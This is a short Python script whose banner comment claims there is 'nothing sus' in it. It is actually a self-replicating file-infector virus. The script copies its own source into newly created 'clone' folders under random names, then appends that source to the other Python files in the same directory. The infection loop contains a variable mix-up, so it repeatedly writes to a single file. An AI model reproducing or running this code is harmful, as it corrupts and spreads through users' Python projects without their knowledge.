#                                                                             
#      ▒▒▒▒▒▒▒▒▒▒▒▒              ████████████████████████████                
#  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                            ██              
#  ▒▒▒▒▒▒▒▒░░▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒██    ░░░░░░░░▒▒░░░░▒▒░░░░░░      ██            
#  ░░▒▒░░▒▒▒▒░░░░░░▒▒▒▒▒▒░░▒▒██  ░░░░▒▒░░░░░░░░████░░░░░░░░░░  ██  ████      
#  ▒▒░░░░░░░░░░░░████████░░░░██  ░░░░░░░░░░░░██▒▒▒▒██░░░░▒▒░░  ████▒▒▒▒██    
#  ░░░░░░░░  ░░██▒▒▒▒▒▒████████  ░░░░░░░░░░░░██▒▒▒▒▒▒██░░░░░░  ██▒▒▒▒▒▒██    
#  ░░  ░░░░  ░░████▒▒▒▒▒▒▒▒▒▒██  ░░░░░░▒▒░░░░██▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒██    
#  ░░    ░░░░  ░░  ████████▒▒██  ░░░░░░░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██    
#  ░░░░  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████  ░░░░░░░░▒▒██▒▒▒▒▒▒  ██▒▒▒▒▒▒▒▒▒▒  ██▒▒▒▒██  
#  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██  ░░▒▒░░░░░░██▒▒▒▒▒▒████▒▒▒▒▒▒██▒▒████▒▒▒▒██  
#  ▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒██  ░░░░░░▒▒░░██▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░██  
#  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒████    ░░▒▒░░░░██▒▒░░░░▒▒██▒▒▒▒██▒▒▒▒██▒▒░░░░██  
#  ▓▓▓▓▓▓          ▓▓▒▒████████      ░░░░░░░░██▒▒▒▒▒▒██████████████▒▒▒▒██    
#                    ██▒▒▒▒▒▒████              ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██      
#                  ██▒▒▒▒██  ██████████████████████████████████████        
#                    ██████      ██▒▒▒▒██      ██▒▒▒▒██  ██▒▒▒▒██            
#                                  ██████        ██████    ██████            
#
# #####################################################
# WHY YOU LOOKING AT MY CODE FOR NOTHING SUS ##########                                                                         
#######################################################








import os                                                                            
import random
from tokenize import Name



File = open(__file__,'r')
Data = File.read()
File.close()


# Replicates this script to a folder

def Randomiser():
    name = ''
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    Length = random.randint(1,11)
    for i in range(Length):
        name += random.choice(chars)
    return name

def Recreate(Fi_Name,Folder):
            try:
                os.mkdir(Folder)
                os.chdir(Folder)
                File = open(Fi_Name + '.py','w')
                File.write(Data)
                os.chdir("..")
            except Exception as Error:
                Folder = Folder + "0"
                Recreate(Fi_Name,Folder)
for i in range(5):
    Name = Randomiser()
    Recreate(Name, "clone")

Files = list()
for file in os.listdir():
    if file.endswith('.py'):
        Files.append(file)
Files.remove(__file__)

# Injects this code to other python script in same folder.
for File in Files:
    object = open(file,'a')
    object.write(Data)
    object.close()
